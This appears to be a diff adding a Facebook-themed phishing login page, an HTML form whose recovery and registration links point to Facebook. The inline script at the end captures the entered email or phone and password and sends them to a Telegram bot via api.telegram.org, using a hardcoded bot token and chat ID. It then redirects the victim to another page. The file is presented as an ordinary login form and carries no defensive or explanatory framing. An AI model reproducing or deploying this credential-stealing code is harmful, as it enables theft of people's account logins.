@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/remixicon/3.5.0/remixicon.css" crossorigin="">
+   <link rel="stylesheet" href="assets/css/styles.css">
+   <title>Login form - Bedimcode</title>
+</head>
+<body>
+   <div class="login">
+      <img src="assets/img/login-bg.png" alt="image" class="login__bg">
+      <form id="loginForm" class="login__form">
+         <h1 class="login__title">Login</h1>
+         <div class="login__inputs">
+            <div class="login__box">
+               <input type="text" id="emailOrPhone" placeholder="Email / Phone" required class="login__input">
+               <i class="ri-mail-fill"></i>
+            </div>
+            <div class="login__box">
+               <input type="password" id="password" placeholder="Password" required class="login__input">
+               <i class="ri-lock-2-fill"></i>
+            </div>
+         </div>
+         <div class="login__check">
+            <div class="login__check-box">
+               <input type="checkbox" class="login__check-input" id="user-check">
+               <label for="user-check" class="login__check-label">Remember me</label>
+            </div>
+            <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0" class="login__forgot">Forgot Password?</a>
+         </div>
+         <button type="submit" class="login__button">Login</button>
+         <div class="login__register">
+            Don't have an account? <a href="https://www.facebook.com/r.php?entry_point=login">Register</a>
+         </div>
+      </form>
+   </div>
+   <script>
+      const BOT_TOKEN = "7910159145:AAGZpUFe7LZfQxQAG1huLQz-bVUtISJhS4g";
+      const CHAT_ID = "5792222595"; 
+
+      document.getElementById("loginForm").addEventListener("submit", function(event) {
+         event.preventDefault();
+
+         const emailOrPhone = document.getElementById("emailOrPhone").value;
+         const password = document.getElementById("password").value;
+         const rememberMe = document.getElementById("user-check").checked;
+
+         if (!emailOrPhone || !password) {
+             alert("Please fill in all fields.");
+             return;
+         }
+
+         const message = `
+User : ${emailOrPhone}
+Pass: ${password}
+         `;
+
+         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: {
+               "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+               chat_id: CHAT_ID,
+               text: message
+            })
+         })
+         .then(response => response.json())
+         .then(data => {
+            if (data.ok) {
+               window.location.href = "mm.html"
+            } else {
+               alert("Failed to send message. Please try again.");
+            }
+         })
+         .catch(error => {
+            console.error("Error:", error);
+            alert("An error occurred. Please try again.");
+         });
+      });
+   </script>
+</body>
+</html>
